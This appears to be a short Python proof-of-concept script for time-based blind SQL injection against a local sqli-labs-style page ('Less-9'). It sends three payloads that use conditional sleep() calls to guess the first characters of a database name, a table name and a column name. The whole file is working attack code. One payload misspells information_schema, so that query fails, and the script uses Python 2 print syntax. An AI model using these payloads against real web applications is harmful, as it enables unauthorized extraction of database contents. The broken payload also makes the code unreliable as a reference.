import requests
import time
"""
time inject,if ok,now,if not sleep some seconds

demo,this poc need use loop in limit x,1
"""

url = "http://127.0.0.1/Less-9/?id=1'"

#1=database 2=table 3=column
payload_1 = "and if(ascii(substr((select database()),1,1))=115,1,sleep(5)) --+"
payload_2 = "and if(ascii(substr((select table_name from informaiton_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5)) --+"
payload_3 = "and if(ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 0,1),1,1))=105,1,sleep(5)) --+"

payload = []
payload.append(payload_1)
payload.append(payload_2)
payload.append(payload_3)

for i in payload:
    start = time.time()
    res = requests.get(url + i).text
    end = time.time()
    t = end - start
    if t < 2:
        print 'ok'
        print url + i
    else:
        pass


